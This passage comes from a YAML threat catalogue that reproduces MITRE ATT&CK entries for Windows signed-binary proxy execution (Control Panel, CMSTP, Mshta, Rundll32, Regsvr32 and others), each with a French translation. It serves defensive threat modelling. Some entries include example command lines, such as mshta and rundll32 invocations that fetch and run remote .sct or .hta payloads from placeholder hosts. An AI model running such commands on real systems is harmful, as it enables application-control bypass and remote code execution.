      Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also
      bypass application and/or file extension allow lists.


      Adversaries may also rename malicious DLL files (.dll) with Control Panel file
      extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control
      Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL
      file specification and do not export <code>CPlApplet</code> functions, they
      are loaded and executed through its <code>DllEntryPoint</code> when Control
      Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly
      executable.(Citation: ESET InvisiMole June 2020)

      https://attack.mitre.org/techniques/T1218/002'
    translations:
      fr:
        name: "Panneau de contr\xF4le"
        description: "Les adversaires peuvent abuser control.exe pour ex\xE9cuter\
          \ par procuration des charges utiles malveillantes. Le processus binaire\
          \ (control.exe) du Panneau de configuration Windows g\xE8re l\u2019ex\xE9\
          cution des \xE9l\xE9ments du Panneau de configuration, qui sont des utilitaires\
          \ permettant aux utilisateurs de visualiser et d\u2019ajuster les param\xE8\
          tres de l\u2019ordinateur.\n\nLes \xE9l\xE9ments du Panneau de configuration\
          \ sont des fichiers ex\xE9cutables enregistr\xE9s (.exe) ou du Panneau de\
          \ configuration (.cpl), ces derniers \xE9tant en r\xE9alit\xE9 des fichiers\
          \ de biblioth\xE8que \xE0 liaison dynamique (.dll) qui exportent une fonction\
          \ <code>CPlApplet</code>. (Citation : Microsoft mettant en \u0153uvre le\
          \ CPL)(Citation : Malware TrendMicro CPL Jan 2014) Pour faciliter l\u2019\
          utilisation, les \xE9l\xE9ments du Panneau de configuration incluent g\xE9\
          n\xE9ralement des menus graphiques accessibles aux utilisateurs apr\xE8\
          s leur enregistrement et leur chargement dans le Panneau de configuration.\
          \ (Citation : Microsoft mettant en \u0153uvre le CPL) Les \xE9l\xE9ments\
          \ du Panneau de Contr\xF4le peuvent \xEAtre ex\xE9cut\xE9s directement depuis\
          \ la ligne de commande, de mani\xE8re programmatique via un appel d\u2019\
          interface de programmation d\u2019applications (API), ou simplement en double-cliquant\
          \ sur le fichier. (Citation : Microsoft mettant en \u0153uvre le CPL) (Citation\
          \ : Malware TrendMicro CPL Jan 2014)(Citation : Malware TrendMicro CPL d\xE9\
          c. 2013)\n\nLes \xE9l\xE9ments malveillants du panneau de contr\xF4le peuvent\
          \ \xEAtre diffus\xE9s via des campagnes [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ (Citation : TrendMicro CPL Malware janvier 2014) (Citation : TrendMicro\
          \ CPL Malware d\xE9c. 2013) ou ex\xE9cut\xE9s dans le cadre d\u2019un malware\
          \ multi-\xE9tapes. (Citation : Palo Alto Reaver, novembre 2017) Les \xE9\
          l\xE9ments du panneau de configuration, en particulier les fichiers CPL,\
          \ peuvent \xE9galement contourner les listes d\u2019applications et/ou d\u2019\
          extensions de fichiers.\n\nLes adversaires peuvent \xE9galement renommer\
          \ des fichiers DLL malveillants (.dll) avec des extensions de fichiers du\
          \ Panneau de Configuration (.cpl) et les enregistrer sur <code>HKCU\\Software\\\
          Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. M\xEAme\
          \ lorsque ces DLL enregistr\xE9es ne respectent pas la sp\xE9cification\
          \ du fichier CPL et n\u2019exportent pas les fonctions <code>CPlApplet</code>,\
          \ elles sont charg\xE9es et ex\xE9cut\xE9es via <code>son DllEntryPoint</code>\
          \ lors de l\u2019ex\xE9cution du Panneau de Contr\xF4le. Les fichiers CPL\
          \ qui n\u2019exportent pas <code>CPlApplet</code> ne sont pas directement\
          \ ex\xE9cutables. (Citation : ESET InvisiMole juin 2020)\nhttps://attack.mitre.org/techniques/T1218/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.003
    ref_id: T1218.003
    name: CMSTP
    description: "Adversaries may abuse CMSTP to proxy execution of malicious code.\
      \ The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line\
      \ program used to install Connection Manager service profiles. (Citation: Microsoft\
      \ Connection Manager Oct 2009) CMSTP.exe accepts an installation information\
      \ file (INF) as a parameter and installs a service profile leveraged for remote\
      \ access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected\
      \ with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar\
      \ to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201DSquiblydoo\u201D\
      , CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP\
      \ Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter\
      \ CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation:\
      \ Endurant CMSTP July 2018) This execution may also bypass AppLocker and other\
      \ application control defenses since CMSTP.exe is a legitimate binary that may\
      \ be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account\
      \ Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary\
      \ commands from a malicious INF through an auto-elevated COM interface. (Citation:\
      \ MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List)\
      \ (Citation: Endurant CMSTP July 2018)\nhttps://attack.mitre.org/techniques/T1218/003"
    translations:
      fr:
        name: CMSTP
        description: "Les adversaires peuvent abuser du CMSTP pour proxy l\u2019ex\xE9\
          cution de code malveillant. L\u2019Installateur de profils Microsoft Connection\
          \ Manager (CMSTP.exe) est un programme en ligne de commande utilis\xE9 pour\
          \ installer les profils de service du Gestionnaire de connexions. (Citation\
          \ : Microsoft Connection Manager oct. 2009) CMSTP.exe accepte un fichier\
          \ d\u2019information d\u2019installation (INF) comme param\xE8tre et installe\
          \ un profil de service utilis\xE9 pour les connexions d\u2019acc\xE8s \xE0\
          \ distance.\n\nLes adversaires peuvent fournir \xE0 CMSTP.exe fichiers INF\
          \ infect\xE9s par des commandes malveillantes. (Citation : Utilisation du\
          \ CMSTP Twitter janvier 2018) \xC0 l\u2019instar de [Regsvr32](https://attack.mitre.org/techniques/T1218/010)\
          \ / \xAB Squiblydoo \xBB, CMSTP.exe peuvent \xEAtre abus\xE9s pour charger\
          \ et ex\xE9cuter des DLL (Citation : MSitPros CMSTP ao\xFBt 2017) et/ou\
          \ des scriptlets COM (SCT) depuis des serveurs distants. (Citation : Twitter\
          \ CMSTP janvier 2018) (Citation : Liste de contournement GitHub Ultimate\
          \ AppLocker) (Citation : Endurant CMSTP juillet 2018) Cette ex\xE9cution\
          \ peut \xE9galement contourner AppLocker et d\u2019autres d\xE9fenses de\
          \ contr\xF4le applicatif puisque CMSTP.exe est un binaire l\xE9gitime qui\
          \ peut \xEAtre sign\xE9 par Microsoft.\n\nCMSTP.exe peuvent \xE9galement\
          \ \xEAtre abus\xE9s pour [contourner le contr\xF4le du compte utilisateur](https://attack.mitre.org/techniques/T1548/002)\
          \ et ex\xE9cuter des commandes arbitraires depuis un INF malveillant via\
          \ une interface COM auto-\xE9lev\xE9e. (Citation : MSitPros CMSTP ao\xFB\
          t 2017) (Citation : Liste de contournement GitHub Ultimate AppLocker) (Citation\
          \ : Endurant CMSTP juillet 2018)\nhttps://attack.mitre.org/techniques/T1218/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.004
    ref_id: T1218.004
    name: InstallUtil
    description: 'Adversaries may use InstallUtil to proxy execution of code through
      a trusted Windows utility. InstallUtil is a command-line utility that allows
      for installation and uninstallation of resources by executing specific installer
      components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil
      binary may also be digitally signed by Microsoft and located in the .NET directories
      on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code>
      and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.


      InstallUtil may also be used to bypass application control through use of attributes
      within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.
      (Citation: LOLBAS Installutil)

      https://attack.mitre.org/techniques/T1218/004'
    translations:
      fr:
        name: InstallUtil
        description: "Les adversaires peuvent utiliser InstallUtil pour proxy l\u2019\
          ex\xE9cution du code via un utilitaire Windows de confiance. InstallUtil\
          \ est un utilitaire en ligne de commande qui permet l\u2019installation\
          \ et la d\xE9sinstallation de ressources en ex\xE9cutant des composants\
          \ sp\xE9cifiques de l\u2019installateur sp\xE9cifi\xE9s dans des binaires\
          \ .NET. (Citation : MSDN InstallUtil) Le binaire InstallUtil peut \xE9galement\
          \ \xEAtre sign\xE9 num\xE9riquement par Microsoft et se situer dans les\
          \ r\xE9pertoires .NET d\u2019un syst\xE8me Windows : <code>C\_:\\Windows\\\
          Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> et <code>C\_\
          :\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\
          \nInstallUtil peut \xE9galement \xEAtre utilis\xE9 pour contourner le contr\xF4\
          le des applications en utilisant des attributs dans le binaire qui ex\xE9\
          cutent la classe d\xE9cor\xE9e de l\u2019attribut <code>[System.ComponentModel.RunInstaller(true)]</code>.\
          \ (Citation : LOLBAS Installutil)\nhttps://attack.mitre.org/techniques/T1218/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.005
    ref_id: T1218.005
    name: Mshta
    description: "Adversaries may abuse mshta.exe to proxy execution of malicious\
      \ .hta files and Javascript or VBScript through a trusted Windows utility. There\
      \ are several examples of different types of threats leveraging mshta.exe during\
      \ initial compromise and for execution of code (Citation: Cylance Dust Storm)\
      \ (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging\
      \ HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April\
      \ 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications\
      \ (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications\
      \ that execute using the same models and technologies of Internet Explorer,\
      \ but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may\
      \ be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"\
      GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey\
      \ may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\
      \nMshta.exe can be used to bypass application control solutions that do not\
      \ account for its potential use. Since mshta.exe executes outside of the Internet\
      \ Explorer's security context, it also bypasses browser security settings. (Citation:\
      \ LOLBAS Mshta)\nhttps://attack.mitre.org/techniques/T1218/005"
    translations:
      fr:
        name: Mshta
        description: "Les adversaires peuvent abuser mshta.exe pour ex\xE9cuter par\
          \ procuration de fichiers .hta malveillants et de Javascript ou VBScript\
          \ via un utilitaire Windows de confiance. Il existe plusieurs exemples de\
          \ diff\xE9rents types de menaces exploitant mshta.exe lors de la compromission\
          \ initiale et pour l\u2019ex\xE9cution du code (Citation : Cyclance Dust\
          \ Storm) (Citation : Red Canary HTA Abuse Part Deux) (Citation : FireEye\
          \ Attacks Exploiting HTA) (Citation : Airbus Security Kovter Analysis) (Citation\
          \ : FireEye FIN7 avril 2017) \n\nMshta.exe est un utilitaire qui ex\xE9\
          cute les fichiers Microsoft HTML Applications (HTA). (Citation : Application\
          \ HTML de Wikip\xE9dia) Les HTA sont des applications autonomes qui s\u2019\
          ex\xE9cutent en utilisant les m\xEAmes mod\xE8les et technologies d\u2019\
          Internet Explorer, mais en dehors du navigateur. (Citation : Applications\
          \ HTML MSDN)\n\nLes fichiers peuvent \xEAtre ex\xE9cut\xE9s par mshta.exe\
          \ via un script en ligne : <code>mshta vbscript\_:Close(Execute(\xAB\_GetObject(\xAB\
          \_\"script\_:https[\_:]//webserver/payload[.]SCT\"\_\xBB)\_\xBB))</code>\n\
          \nIls peuvent \xE9galement \xEAtre ex\xE9cut\xE9s directement depuis les\
          \ URL : <code>mshta http[\_:]//webserver/payload[.]Hta</code>\n\nMshta.exe\
          \ peuvent \xEAtre utilis\xE9s pour contourner les solutions de contr\xF4\
          le d\u2019application qui ne tiennent pas compte de leur utilisation potentielle.\
          \ Puisque mshta.exe s\u2019ex\xE9cute en dehors du contexte de s\xE9curit\xE9\
          \ d\u2019Internet Explorer, il contourne \xE9galement les param\xE8tres\
          \ de s\xE9curit\xE9 du navigateur. (Citation : LOLBAS Mshta)\nhttps://attack.mitre.org/techniques/T1218/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.007
    ref_id: T1218.007
    name: Msiexec
    description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
      payloads. Msiexec.exe is the command-line utility for the Windows Installer
      and is thus commonly associated with executing installation packages (.msi).(Citation:
      Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.


      Adversaries may abuse msiexec.exe to launch local or network accessible MSI
      files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation:
      TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems,
      msiexec.exe can be used to bypass application control solutions that do not
      account for its potential abuse. Msiexec.exe execution may also be elevated
      to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation:
      Microsoft AlwaysInstallElevated 2018)

      https://attack.mitre.org/techniques/T1218/007'
    translations:
      fr:
        name: Msiexec
        description: "Les adversaires peuvent abuser msiexec.exe pour ex\xE9cuter\
          \ par procuration des charges utiles malveillantes. Msiexec.exe est l\u2019\
          utilitaire en ligne de commande de l\u2019installateur Windows et est donc\
          \ couramment associ\xE9 \xE0 l\u2019ex\xE9cution de paquets d\u2019installation\
          \ (.msi). (Citation : Microsoft msiexec) Le Msiexec.exe binaire peut \xE9\
          galement \xEAtre sign\xE9 num\xE9riquement par Microsoft.\n\nLes adversaires\
          \ peuvent abuser de msiexec.exe pour lancer des fichiers MSI locaux ou accessibles\
          \ en r\xE9seau. Msiexec.exe peut \xE9galement ex\xE9cuter des DLL. (Citation\
          \ : LOLBAS Msiexec)(Citation : TrendMicro Msiexec f\xE9v 2018) Puisqu\u2019\
          il peut \xEAtre sign\xE9 et natif sur les syst\xE8mes Windows, msiexec.exe\
          \ peut \xEAtre utilis\xE9 pour contourner les solutions de contr\xF4le d\u2019\
          applications qui ne tiennent pas compte de son potentiel abus. Msiexec.exe\u2019\
          ex\xE9cution peut \xE9galement \xEAtre \xE9lev\xE9e aux privil\xE8ges SYST\xC8\
          ME si la politique <code>AlwaysInstallElevated</code> est activ\xE9e. (Citation\
          \ : Microsoft AlwaysInstallElevated 2018)\nhttps://attack.mitre.org/techniques/T1218/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.008
    ref_id: T1218.008
    name: Odbcconf
    description: 'Adversaries may abuse odbcconf.exe to proxy execution of malicious
      payloads. Odbcconf.exe is a Windows utility that allows you to configure Open
      Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft
      odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.


      Adversaries may abuse odbcconf.exe to bypass application control solutions that
      do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010),
      odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs
      (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>).
      (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation:
      TrendMicro Cobalt Group Nov 2017)

      https://attack.mitre.org/techniques/T1218/008'
    translations:
      fr:
        name: Odbcconf
        description: "Les adversaires peuvent abuser odbcconf.exe pour ex\xE9cuter\
          \ par procuration des charges utiles malveillantes. Odbcconf.exe\u2019est\
          \ un utilitaire Windows qui permet de configurer les pilotes et les noms\
          \ de sources de donn\xE9es Open Database Connectivity (ODBC). (Citation\
          \ : Microsoft odbcconf.exe) Le Odbcconf.exe binaire peut \xEAtre sign\xE9\
          \ num\xE9riquement par Microsoft.\n\nLes adversaires peuvent abuser de odbcconf.exe\
          \ pour contourner des solutions de contr\xF4le d\u2019application qui ne\
          \ prennent pas en compte leur potentiel abus. Similaire \xE0 [Regsvr32](https://attack.mitre.org/techniques/T1218/010),\
          \ odbcconf.exe poss\xE8de un drapeau <code>REGSVR</code> qui peut \xEAtre\
          \ mal utilis\xE9 pour ex\xE9cuter des DLL (ex : <code>odbcconf.exe /S /A\
          \ &lbrace\_;REGSVR \xAB\_C\_:\\Users\\Public\\file.dll\"&rbrace\_;</code>).\
          \ (Citation : LOLBAS Odbcconf)(Citation : TrendMicro Squiblydoo ao\xFBt\
          \ 2017)(Citation : TrendMicro Cobalt Group nov. 2017)\nhttps://attack.mitre.org/techniques/T1218/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.009
    ref_id: T1218.009
    name: Regsvcs/Regasm
    description: 'Adversaries may abuse Regsvcs and Regasm to proxy execution of code
      through a trusted Windows utility. Regsvcs and Regasm are Windows command-line
      utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001)
      (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.
      (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)


      Both utilities may be used to bypass application control through use of attributes
      within the binary to specify code that should be run before registration or
      unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code>
      respectively. The code with the registration and unregistration attributes will
      be executed even if the process is run under insufficient privileges and fails
      to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)

      https://attack.mitre.org/techniques/T1218/009'
    translations:
      fr:
        name: "R\xE9gulations/Regasm"
        description: "Les adversaires peuvent abuser de Regsvcs et Regasm pour proxy\
          \ l\u2019ex\xE9cution du code via un utilitaire Windows de confiance. Regsvcs\
          \ et Regasm sont des utilitaires de ligne de commande Windows utilis\xE9\
          s pour enregistrer les assemblages .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ (COM). Les deux sont des binaires qui peuvent \xEAtre sign\xE9s num\xE9\
          riquement par Microsoft. (Citation : R\xE8glements MSDN) (Citation : Regasm\
          \ MSDN)\n\nLes deux utilitaires peuvent \xEAtre utilis\xE9s pour contourner\
          \ le contr\xF4le de l\u2019application en utilisant des attributs dans le\
          \ binaire pour sp\xE9cifier le code \xE0 ex\xE9cuter avant l\u2019enregistrement\
          \ ou le d\xE9senregistrement : <code>[ComRegisterFunction]</code> ou <code>[ComUnregisterFunction]</code>\
          \ respectivement. Le code avec les attributs d\u2019enregistrement et de\
          \ d\xE9senregistrement sera ex\xE9cut\xE9 m\xEAme si le processus est ex\xE9\
          cut\xE9 avec des privil\xE8ges insuffisants et ne s\u2019ex\xE9cute pas.\
          \ (Citation : LOLBAS Regsvcs)(Citation : LOLBAS Regasm)\nhttps://attack.mitre.org/techniques/T1218/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.010
    ref_id: T1218.010
    name: Regsvr32
    description: 'Adversaries may abuse Regsvr32.exe to proxy execution of malicious
      code. Regsvr32.exe is a command-line program used to register and unregister
      object linking and embedding controls, including dynamic link libraries (DLLs),
      on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.
      (Citation: Microsoft Regsvr32)


      Malicious usage of Regsvr32.exe may avoid triggering security tools that may
      not monitor execution of, and modules loaded by, the regsvr32.exe process because
      of allowlists or false positives from Windows using regsvr32.exe for normal
      operations. Regsvr32.exe can also be used to specifically bypass application
      control using functionality to load COM scriptlets to execute DLLs under user
      permissions. Since Regsvr32.exe is network and proxy aware, the scripts can
      be loaded by passing a uniform resource locator (URL) to file on an external
      Web server as an argument during invocation. This method makes no changes to
      the Registry as the COM object is not actually registered, only executed. (Citation:
      LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo"
      and has been used in campaigns targeting governments. (Citation: Carbon Black
      Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)


      Regsvr32.exe can also be leveraged to register a COM Object used to establish
      persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015).
      (Citation: Carbon Black Squiblydoo Apr 2016)

      https://attack.mitre.org/techniques/T1218/010'
    translations:
      fr:
        name: Regsvr32
        description: "Les adversaires peuvent abuser Regsvr32.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Regsvr32.exe est un programme en\
          \ ligne de commande utilis\xE9 pour enregistrer et d\xE9senregistrer les\
          \ contr\xF4les de liaison et d\u2019int\xE9gration d\u2019objets, y compris\
          \ les biblioth\xE8ques de liaison dynamique (DLL), sur les syst\xE8mes Windows.\
          \ Le Regsvr32.exe binaire peut \xE9galement \xEAtre sign\xE9 par Microsoft.\
          \ (Citation : Microsoft Regsvr32)\n\nL\u2019utilisation malveillante de\
          \ Regsvr32.exe peut \xE9viter de d\xE9clencher des outils de s\xE9curit\xE9\
          \ qui ne peuvent pas surveiller l\u2019ex\xE9cution et les modules charg\xE9\
          s par le processus regsvr32.exe en raison des listes de permis ou des faux\
          \ positifs de Windows utilisant regsvr32.exe pour des op\xE9rations normales.\
          \ Regsvr32.exe peut \xE9galement \xEAtre utilis\xE9 pour contourner sp\xE9\
          cifiquement le contr\xF4le d\u2019application en utilisant la fonctionnalit\xE9\
          \ de chargement de scriptlets COM pour ex\xE9cuter des DLL sous permissions\
          \ utilisateur. Puisque Regsvr32.exe est conscient du r\xE9seau et du proxy,\
          \ les scripts peuvent \xEAtre charg\xE9s en passant un localisateur de ressources\
          \ uniforme (URL) au fichier sur un serveur Web externe en tant qu\u2019\
          argument lors de l\u2019invocation. Cette m\xE9thode n\u2019apporte aucun\
          \ changement au Registre car l\u2019objet COM n\u2019est pas r\xE9ellement\
          \ enregistr\xE9, seulement ex\xE9cut\xE9. (Citation : LOLBAS Regsvr32) Cette\
          \ variante de la technique est souvent appel\xE9e \xAB Squiblydoo \xBB et\
          \ a \xE9t\xE9 utilis\xE9e dans des campagnes ciblant les gouvernements.\
          \ (Citation : Carbon Black Squiblydoo avril 2016) (Citation : FireEye Regsvr32\
          \ ciblant le gouvernement mongol)\n\nRegsvr32.exe peuvent \xE9galement \xEA\
          tre exploit\xE9s pour enregistrer un objet COM, utilis\xE9 pour \xE9tablir\
          \ la persistance via [d\xE9tournement du mod\xE8le d\u2019objet composant](https://attack.mitre.org/techniques/T1546/015).\
          \ (Citation : Carbon Black Squiblydoo avril 2016)\nhttps://attack.mitre.org/techniques/T1218/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.011
    ref_id: T1218.011
    name: Rundll32
    description: 'Adversaries may abuse rundll32.exe to proxy execution of malicious
      code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)),
      may avoid triggering security tools that may not monitor execution of the rundll32.exe
      process because of allowlists or false positives from normal operations. Rundll32.exe
      is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname,
      DLLfunction}</code>).


      Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002)
      Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code>
      and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes
      rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)
      can be proxied through Rundll32.exe.


      Rundll32 can also be used to execute scripts such as JavaScript. This can be
      done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
      ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
      behavior has been seen used by malware such as Poweliks.(Citation: This is Security
      Command Line Confusion)


      Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll,
      ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs
      or scripts indirectly, making their activity appear more legitimate and evading
      detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)


      Adversaries may also attempt to obscure malicious code from analysis by abusing
      the manner in which rundll32.exe loads DLL function names. As part of Windows
      compatibility support for various character sets, rundll32.exe will first check
      for wide/Unicode then ANSI character-supported functions before loading the
      specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll,
      ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>,
      or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>).
      Adversaries may therefore obscure malicious code by creating multiple identical
      exported function names and appending <code>W</code> and/or <code>A</code> to
      harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github
      NoRunDll) DLL functions can also be exported and executed by an ordinal number
      (ex: <code>rundll32.exe file.dll,#1</code>).


      Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036)
      techniques (such as changing DLL file names, file extensions, or function names)
      to further conceal execution of a malicious payload.(Citation: rundll32.exe
      defense evasion)

      https://attack.mitre.org/techniques/T1218/011'
    translations:
      fr:
        name: Rundll32
        description: "Les adversaires peuvent abuser rundll32.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Utiliser rundll32.exe, l\u2019ex\xE9\
          cution directe (c\u2019est-\xE0-dire [Shared Modules](https://attack.mitre.org/techniques/T1129))\
          \ peut \xE9viter de d\xE9clencher des outils de s\xE9curit\xE9 qui ne surveillent\
          \ pas l\u2019ex\xE9cution du processus rundll32.exe en raison des listes\
          \ de permis ou des faux positifs issus d\u2019op\xE9rations normales. Rundll32.exe\
          \ est couramment associ\xE9 \xE0 l\u2019ex\xE9cution de charges utiles DLL\
          \ (ex : <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe\
          \ peuvent \xE9galement \xEAtre utilis\xE9s pour ex\xE9cuter des fichiers\
          \ d\u2019\xE9l\xE9ments du [Panneau de configuration](https://attack.mitre.org/techniques/T1218/002)\
          \ (.cpl) via les fonctions de shell32.dll non <code>document\xE9es Control_RunDLL</code>\
          \ et <code>Control_RunDLLAsUser</code>. Double-cliquer sur un fichier .cpl\
          \ provoque \xE9galement l\u2019ex\xE9cution de rundll32.exe. (Citation :\
          \ Trend Micro CPL) Par exemple, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)\
          \ peut \xEAtre proxy\xE9 via Rundll32.exe.\n\nRundll32 peut \xE9galement\
          \ \xEAtre utilis\xE9 pour ex\xE9cuter des scripts tels que JavaScript. Cela\
          \ peut se faire avec une syntaxe similaire \xE0 celle-ci : <code>rundll32.exe\
          \ javascript :\"\\.. \\mshtml,RunHTMLApplication \xBB ; document.write()\_\
          ; GetObject(\"script\_:https[\_:]//www[.]Exemple[.]com/malicious.sct\_\xBB\
          )\_\xBB Ce</code> comportement a \xE9t\xE9 observ\xE9 par des logiciels\
          \ malveillants tels que Poweliks. (Citation : Ceci est une confusion de\
          \ ligne de commande de s\xE9curit\xE9)\n\nLes acteurs malveillants peuvent\
          \ \xE9galement abuser de DLL syst\xE8me l\xE9gitimes et sign\xE9s (par exemple,\
          \ <code>zipfldr.dll, ieframe.dll</code>) avec <code>rundll32.exe</code>\
          \ d\u2019ex\xE9cuter des programmes ou scripts malveillants indirectement,\
          \ rendant leur activit\xE9 plus l\xE9gitime et \xE9chappant \xE0 la d\xE9\
          tection. (Citation : lolbas project Zipfldr.dll)(Citation : lolbas project\
          \ Ieframe.dll)\n\nLes adversaires peuvent aussi tenter de dissimuler un\
          \ code malveillant de l\u2019analyse en abusant de la mani\xE8re dont rundll32.exe\
          \ charge les noms des fonctions DLL. Dans le cadre du support de compatibilit\xE9\
          \ Windows pour divers ensembles de caract\xE8res, rundll32.exe v\xE9rifiera\
          \ d\u2019abord les fonctions larges/Unicode puis ANSI avant de charger la\
          \ fonction sp\xE9cifi\xE9e (par exemple, avec la <code>commande rundll32.exe\
          \ ExampleDLL.dll, ExampleFunction</code>, rundll32.exe commencerait par\
          \ tenter d\u2019ex\xE9cuter <code>ExampleFunctionW</code>, ou en cas d\u2019\
          \xE9chec <code>de cette ExampleFunctionA</code>, avant de charger <code>ExampleFunction</code>).\
          \ Les adversaires peuvent donc masquer le code malveillant en cr\xE9ant\
          \ plusieurs noms de fonctions export\xE9s identiques et en ajoutant <code>W</code>\
          \ et/ou <code>A</code> \xE0 des noms inoffensifs. (Citation : Attaquer Rundll32.exe\
          \ obscurit\xE9)(Citation : Github NoRunDll) Les fonctions DLL peuvent \xE9\
          galement \xEAtre export\xE9es et ex\xE9cut\xE9es par un nombre ordinal (ex\
          \ : <code>rundll32.exe file.dll,#1</code>).\n\nDe plus, les adversaires\
          \ peuvent utiliser des techniques de [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ (comme changer les noms de fichiers DLL, les extensions de fichiers ou\
          \ les noms de fonctions) pour dissimuler davantage l\u2019ex\xE9cution d\u2019\
          une charge utile malveillante. (Citation : rundll32.exe \xE9vitement de\
          \ d\xE9fense)\nhttps://attack.mitre.org/techniques/T1218/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.012
    ref_id: T1218.012
    name: Verclsid
    description: 'Adversaries may abuse verclsid.exe to proxy execution of malicious
      code. Verclsid.exe is known as the Extension CLSID Verification Host and is
      responsible for verifying each shell extension before they are used by Windows
      Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)


      Adversaries may abuse verclsid.exe to execute malicious payloads. This may be
      achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file
      is referenced by a Class ID (CLSID), a unique identification number used to
      identify COM objects. COM payloads executed by verclsid.exe may be able to perform
      various malicious actions, such as loading and executing COM scriptlets (SCT)
      from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)).
      Since the binary may be signed and/or native on Windows systems, proxying execution
      via verclsid.exe may bypass application control solutions that do not account
      for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation:
      BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)

      https://attack.mitre.org/techniques/T1218/012'
    translations:
      fr:
        name: Verclsid
        description: "Les adversaires peuvent abuser verclsid.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Verclsid.exe est connu sous le nom\
